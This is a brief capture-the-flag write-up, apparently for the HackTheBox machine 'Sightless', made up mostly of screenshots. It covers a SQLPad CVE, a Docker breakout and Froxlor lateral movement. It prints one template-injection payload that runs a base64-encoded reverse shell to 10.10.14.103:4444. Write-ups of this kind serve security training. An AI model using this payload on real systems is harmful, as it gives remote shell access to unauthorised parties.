---
title: Sightless
tags:
  - htb
  - easy
---

If you scan with gobuster vhost, you will not get any results, but if you navigate through the website, you will see a button that wants to redirect you directly to a subdomain.

![](https://miro.medium.com/v2/resize:fit:700/1*t2zzEeMYN8raBYmFbk3ZPw.png)

![](https://miro.medium.com/v2/resize:fit:700/1*dtK8xzqeijpNmi3sQYiJfw.png)

## SQLPad CVE

![](https://miro.medium.com/v2/resize:fit:700/1*2h0LV0w3TuWIRXF9oZelBw.png)

![](https://miro.medium.com/v2/resize:fit:700/1*fFY2bKsmL6w2Z45f83DujA.png)

![](https://miro.medium.com/v2/resize:fit:700/1*jtwTlDm4Enuki1ZhuaIoYA.png)

![](https://miro.medium.com/v2/resize:fit:700/1*BROJylg-3NyQWpdBER0l3A.png)

![](https://miro.medium.com/v2/resize:fit:700/1*EbYqAWBQ2fAKm7HebMdQgw.png)

> {{ process.mainModule.require(‘child_process’).exec(‘echo -n  
> c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTAzLzQ0NDQgMD4mMQ== | base64 -d | bash’) }}

![](https://miro.medium.com/v2/resize:fit:700/1*k6YA-J65hIpuvLUx7g2hWA.png)

We are root users, yes, but we are inside the Docker container. At first you may think that you need to do a Docker Breakout. It definitely is, but you should think as simple as possible.

![](https://miro.medium.com/v2/resize:fit:700/1*ffGVPsnyhCdAhT6WDv2zoA.png)

## Docker Breakout (!)

![](https://miro.medium.com/v2/resize:fit:700/1*nGIvYMSmDBwRV-P-HRcn2g.png)

![](https://miro.medium.com/v2/resize:fit:700/1*Eqi0sTnOyrNMKwCZrVL5YQ.png)

## Lateral Movement

![](https://miro.medium.com/v2/resize:fit:700/1*HLVOvoajPE5hsbmKCCVd7A.png)

![](https://miro.medium.com/v2/resize:fit:700/1*4m0HF_NTk2_tkif7w4YZqw.png)

![](https://miro.medium.com/v2/resize:fit:700/1*Zw945mMGBhfQ3W8ebqu0Bw.png)

We accessed the Froxlor service at 127.0.0.0.1:8080 from our local address, but we do not have a username and password to log in.

![](https://miro.medium.com/v2/resize:fit:700/1*hEi1xH3q3y_Arrv_DpBYkg.png)

![](https://miro.medium.com/v2/resize:fit:700/1*o5RpOu_lrRMQOvQ89-NK8w.png)

![](https://miro.medium.com/v2/resize:fit:700/1*yFTitL7_ElMcoXFwvD6iYQ.png)

Then, when you examine the requests sent by pressing the Inspect button, you will have the password for the admin user.

![](https://miro.medium.com/v2/resize:fit:700/1*YyaOoor_aHqEJdNgsyEGpw.png)

![](https://miro.medium.com/v2/resize:fit:700/1*n-9Kl33ZmXYwtzquRmWerw.png)

![](https://miro.medium.com/v2/resize:fit:700/1*teW24sYLXJRLRVfekYljpg.png)

![](https://miro.medium.com/v2/resize:fit:700/1*pPUD8KQ-Y8QgF7zhay8Mdg.png)

![](https://miro.medium.com/v2/resize:fit:700/1*wsXy9BPkGZ8tMHE7HwlI7g.png)

![](https://miro.medium.com/v2/resize:fit:700/1*dtoGwD-SLMHz5_T_zsnwEA.png)

![](https://miro.medium.com/v2/resize:fit:700/1*QDU-T45iW_FjsH2srsL7PA.png)
